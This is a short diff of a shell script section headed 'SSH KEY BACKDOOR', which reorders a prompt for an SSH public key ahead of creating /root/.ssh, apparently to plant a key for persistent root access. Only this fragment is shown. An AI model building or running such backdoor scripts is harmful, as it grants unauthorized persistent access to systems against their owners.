@@ -41,9 +41,9 @@ sleep 2
 # SSH KEY BACKDOOR
 ################################
 
-read -p "Paste SSH public key: " SSHKEY
-
 echo "[+] installing ssh key"
+
+read -p "Paste SSH public key: " SSHKEY
 
 mkdir -p /root/.ssh
 
